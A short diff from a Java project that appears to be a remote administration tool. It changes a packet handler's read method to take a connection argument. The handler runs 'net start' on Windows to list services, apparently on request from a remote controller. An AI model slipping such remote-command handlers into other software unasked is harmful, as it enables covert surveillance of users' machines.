@@ -12,7 +12,7 @@ import com.redpois0n.oslib.OperatingSystem;
 public class Packet77ListServices extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		try {
 			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				Process p = Runtime.getRuntime().exec("net start");
